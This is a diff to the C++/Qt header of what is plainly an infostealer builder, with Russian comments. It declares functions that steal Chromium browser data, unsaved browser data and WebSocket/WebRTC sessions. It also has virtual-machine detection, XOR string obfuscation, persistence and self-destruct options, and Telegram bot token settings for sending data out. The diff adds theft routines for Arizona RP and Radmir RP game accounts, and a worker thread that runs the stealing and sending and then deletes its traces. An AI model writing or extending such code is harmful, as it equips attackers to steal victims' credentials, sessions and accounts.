@@ -5,6 +5,8 @@
 #include <QNetworkAccessManager>
 #include <QTimer>
 #include <QPropertyAnimation>
+#include <QParallelAnimationGroup>
+#include <QAbstractAnimation>
 #include <QNetworkReply>
 #include <QByteArray>
 #include <QInputDialog>
@@ -46,17 +48,18 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <gdiplus.h>
-#include <openssl/evp.h>  // Добавлено для OpenSSL
-#include <openssl/rand.h> // Добавлено для OpenSSL
+#include <openssl/evp.h>
+#include <openssl/rand.h>
+#include "build_key.h" // RandomGenerator и функции генерации ключей
 
 QT_BEGIN_NAMESPACE
 namespace Ui { class MainWindow; }
 QT_END_NAMESPACE
 
-// Объявляем глобальную переменную как extern
+// Глобальная переменная как extern
 extern class MainWindow* g_mainWindow;
 
-// Внешние функции, используемые в main.cpp
+// Внешние функции из main.cpp
 extern std::string GetCustomSystemInfo();
 extern std::string StealChromiumData(const std::string& browser, const std::string& path, const std::string& dir);
 extern std::string StealUnsavedBrowserData(const std::string& browser, const std::string& cachePath);
@@ -65,46 +68,10 @@ extern std::string CaptureWebSocketSessions(const std::string& processName);
 extern std::string CaptureWebRTCSessions(const std::string& processName);
 extern bool CheckVirtualEnvironment();
 
-// Простая функция для шифрования строк во время компиляции (XOR)
+// Функция для шифрования строк во время компиляции (XOR)
 constexpr char encryptChar(char c, size_t pos) {
     return c ^ (0xAA + (pos % 0xFF));
 }
-
-// Объявление decryptString как внешней функции
-std::string decryptString(const std::string& encrypted, size_t keyOffset = 0);
-
-// Класс для генерации случайных чисел
-class RandomGenerator {
-public:
-    static RandomGenerator& getGenerator() {
-        static RandomGenerator instance;
-        return instance;
-    }
-
-    std::mt19937& getEngine() { return engine; }
-
-private:
-    RandomGenerator() : engine(std::random_device{}()) {}
-    std::mt19937 engine;
-};
-
-// Класс для работы в отдельном потоке
-class StealerWorker : public QObject {
-    Q_OBJECT
-public:
-    StealerWorker(MainWindow* mainWindow, const std::string& tempDir)
-        : mainWindow(mainWindow), tempDir(tempDir) {}
-
-public slots:
-    void process();
-
-signals:
-    void finished();
-
-private:
-    MainWindow* mainWindow;
-    std::string tempDir;
-};
 
 class MainWindow : public QMainWindow {
     Q_OBJECT
@@ -120,6 +87,7 @@ public:
     std::array<unsigned char, 16> generateIV();
     bool isRunningInVM();
     void emitLog(const QString& message);
+    std::string decryptString(const std::string& encrypted, size_t keyOffset);
 
     void updateConfigFromUI();
     void setupPersistence();
@@ -147,6 +115,8 @@ public:
         bool autoStart = false;
         bool persist = false;
         bool selfDestruct = false;
+        bool arizonaRP = false;  // Изменено на arizonaRP для консистентности
+        bool radmirRP = false;   // Изменено на radmirRP для консистентности
         std::string sendMethod = "Local File";
         std::string buildMethod = "Local Build";
         std::string telegramBotToken = "";
@@ -189,6 +159,8 @@ public:
     QCheckBox* autoStartCheckBox;
     QCheckBox* persistCheckBox;
     QCheckBox* selfDestructCheckBox;
+    QCheckBox* arizonaRPCheckBox;  // Добавлено
+    QCheckBox* radmirRPCheckBox;   // Добавлено
     QTextEdit* textEdit;
     QPushButton* iconBrowseButton;
     QPushButton* buildButton;
@@ -205,6 +177,10 @@ public:
 
     // Публичный метод StealAndSendData
     void StealAndSendData(const std::string& tempDir);
+
+    // Методы для кражи данных из Arizona и Radmir (переименованы для консистентности)
+    std::string StealArizonaRPData(const std::string& dir);
+    std::string StealRadmirRPData(const std::string& dir);
 
 signals:
     void logUpdated(const QString& message, const QString& type = "info");
@@ -261,7 +237,7 @@ private slots:
     void on_buildButton_clicked();
     void on_clearLogsButton_clicked();
 
-    // Дополнительные методы из mainwindow.cpp
+    // Дополнительные методы
     void animateSection(QLabel* sectionLabel, QSpacerItem* spacer);
     std::string generateRandomKey(size_t length);
     std::string generateStubCode(const std::string& key);
@@ -282,15 +258,62 @@ private:
     Ui::MainWindow *ui;
     QNetworkAccessManager *manager;
     QMutex logMutex;
-    QMutex filesMutex; // Добавлен для потокобезопасности collectedFiles
+    QMutex filesMutex;
     bool isBuilding = false;
-    QTimer *buildTimer; // Добавлен из mainwindow.cpp
+    QTimer *buildTimer;
     QTimer *statusCheckTimer;
     qint64 runId = 0;
     qint64 artifactId = 0;
     std::string encryptionKey1;
     std::string encryptionKey2;
     std::string encryptionSalt;
+};
+
+// Класс для работы в отдельном потоке
+class StealerWorker : public QObject {
+    Q_OBJECT
+public:
+    explicit StealerWorker(MainWindow* window, const std::string& tempDir, QObject* parent = nullptr)
+        : QObject(parent), window(window), tempDir(tempDir) {
+        if (!window) {
+            qWarning("StealerWorker: MainWindow pointer is null");
+        }
+    }
+
+public slots:
+    void process() {
+        if (!window) {
+            qWarning("StealerWorker: Cannot process, MainWindow is null");
+            emit finished();
+            return;
+        }
+
+        try {
+            window->StealAndSendData(tempDir);
+            qDebug("StealerWorker: Data stealing and sending completed successfully");
+        } catch (const std::exception& e) {
+            qWarning("StealerWorker: Exception during data stealing: %s", e.what());
+        }
+
+        // Очистка временной директории после завершения
+        std::error_code ec;
+        std::filesystem::remove_all(tempDir, ec);
+        if (ec) {
+            qWarning("StealerWorker: Failed to remove temp directory %s: %s", 
+                     tempDir.c_str(), ec.message().c_str());
+        } else {
+            qDebug("StealerWorker: Temp directory %s removed", tempDir.c_str());
+        }
+
+        emit finished();
+    }
+
+signals:
+    void finished();
+
+private:
+    MainWindow* window;
+    std::string tempDir;
 };
 
 #endif // MAINWINDOW_H
